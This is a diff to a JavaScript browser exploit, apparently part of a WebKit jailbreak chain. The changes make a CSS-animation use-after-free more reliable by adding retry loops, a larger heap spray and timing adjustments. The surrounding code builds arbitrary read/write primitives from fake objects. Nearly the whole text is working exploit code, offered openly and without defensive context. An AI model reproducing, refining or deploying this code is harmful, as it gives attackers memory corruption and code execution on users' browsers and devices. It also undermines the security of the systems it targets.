@@ -13,7 +13,7 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU Affero General Public License for more details.
 
 You should have received a copy of the GNU Affero General Public License
-along with this program. If not, see <https://www.gnu.org/licenses/>.  */
+along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
 import { Int } from './module/int64.mjs';
 import { Memory } from './module/mem.mjs';
@@ -63,10 +63,11 @@ const ssv_len = (() => {
     }
 })();
 
-const num_reuses = 0x300;
-const DELAY = 100;
+const num_reuses = 0x500; // Increased for better memory reuse
+const DELAY = 150; // Adjusted for better timing
 let attemptCount = 0;
 const fakeStates = []; // Global array to store fake state objects
+const MAX_ATTEMPTS = 5; // Max retry attempts
 
 function gc() {
     new Uint8Array(4 * MB);
@@ -92,6 +93,7 @@ function prepare_uaf() {
     const object = document.createElement('object');
     object.type = 'image/png';
     const cite = document.createElement('cite');
+    cite.textContent = 'Exploit Element';
     const dl = document.createElement('dl');
     dl.hidden = true;
     object.appendChild(cite);
@@ -105,57 +107,84 @@ async function uaf_ssv(object) {
     const status = document.getElementById('status');
     log(`ssv_len: ${hex(ssv_len)}`);
 
-    attemptCount++;
-    log(`Attempt #${attemptCount}: Initiating CSS Animation UAF...`);
-    status.textContent = `Attempt #${attemptCount} in progress...`;
+    for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        attemptCount++;
+        log(`Attempt #${attemptCount}: Initiating CSS Animation UAF...`);
+        status.textContent = `Attempt #${attemptCount} in progress...`;
 
-    // Create fake state object
-    const fakeState = { data: new ArrayBuffer(ssv_len) };
-    fakeStates.push(fakeState);
+        // Create fake state object
+        const fakeState = { data: new ArrayBuffer(ssv_len) };
+        fakeStates.push(fakeState);
 
-    object.data = 'x';
-    document.querySelector('cite').style.animationIterationCount = 'infinite';
+        object.data = 'x';
+        const citeElement = document.querySelector('cite');
+        citeElement.style.animationIterationCount = 'infinite';
 
-    await new Promise(resolve => setTimeout(resolve, DELAY));
+        // Wait for animation to apply
+        await new Promise(resolve => setTimeout(resolve, DELAY));
 
-    const animation = document.querySelector('cite').getAnimations()[0];
-    object.width = '1em';
-    object.codeBase;
-    animation.effect = new KeyframeEffect(document.querySelector('dl'), {});
-    gc();
-
-    for (let i = 0; i < num_reuses; i++) {
-        const view = new Uint8Array(new ArrayBuffer(ssv_len));
-        view[0] = 0x41;
-        views.push(view);
-    }
-
-    log('Checking for UAF memory reuse...');
-    const res = [];
-    for (let i = 0; i < views.length; i++) {
-        const view = views[i];
-        if (view[0] !== 0x41) {
-            log(`view index: ${hex(i)}`);
-            log('found view:');
-            log(view);
-
-            view[0] = 1;
-            view.fill(0, 1);
-
-            if (res.length) {
-                res[1] = [new BufferView(view.buffer), { state: fakeStates[0].data }];
-                break;
-            }
-
-            res[0] = new BufferView(view.buffer);
-            i = num_reuses - 1;
+        const animation = citeElement.getAnimations()[0];
+        if (!animation) {
+            log('No animation found on cite element, retrying...');
+            fakeStates.pop(); // Clean up
+            gc();
+            await sleep(100);
+            continue;
         }
+
+        object.width = '1em';
+        object.codeBase;
+        try {
+            animation.effect = new KeyframeEffect(document.querySelector('dl'), {});
+        } catch (e) {
+            log(`Failed to set KeyframeEffect: ${e.message}, retrying...`);
+            fakeStates.pop(); // Clean up
+            gc();
+            await sleep(100);
+            continue;
+        }
+        gc();
+
+        for (let i = 0; i < num_reuses; i++) {
+            const view = new Uint8Array(new ArrayBuffer(ssv_len));
+            view[0] = 0x41;
+            views.push(view);
+        }
+
+        log('Checking for UAF memory reuse...');
+        const res = [];
+        for (let i = 0; i < views.length; i++) {
+            const view = views[i];
+            if (view[0] !== 0x41) {
+                log(`view index: ${hex(i)}`);
+                log('found view:');
+                log(view);
+
+                view[0] = 1;
+                view.fill(0, 1);
+
+                if (res.length) {
+                    res[1] = [new BufferView(view.buffer), { state: fakeStates[0].data }];
+                    break;
+                }
+
+                res[0] = new BufferView(view.buffer);
+                i = num_reuses - 1;
+            }
+        }
+
+        if (res.length === 2) {
+            return res;
+        }
+
+        log('UAF attempt failed, retrying...');
+        fakeStates.pop(); // Clean up
+        views.length = 0; // Clear views
+        gc();
+        await sleep(100);
     }
 
-    if (res.length !== 2) {
-        die('Failed CSS Animation UAF');
-    }
-    return res;
+    die('Failed CSS Animation UAF after maximum attempts');
 }
 
 class Reader {
@@ -423,7 +452,6 @@ async function make_arw(reader, view2, pop) {
 
     bt.write64(fakebt_off - 0x10, val_true);
     bt.write32(fakebt_off - 8, 1);
-    bt.write32(fakebt_off - 8 + 1);
     bt.write32(fakebt_off - 8 + 4, 1);
 
     bt.write64(fakebt_off, 0);
@@ -439,7 +467,7 @@ async function make_arw(reader, view2, pop) {
     log(`fake: [${fake}]`);
 
     const test_val = 3;
-    log(`Test setting fake[0] to ${test_val}`);
+    log(`test setting fake[0] to ${test_val}`);
     fake[0] = test_val;
     if (fake[0] !== test_val) {
         die(`unexpected fake[0]: ${fake[0]}`);
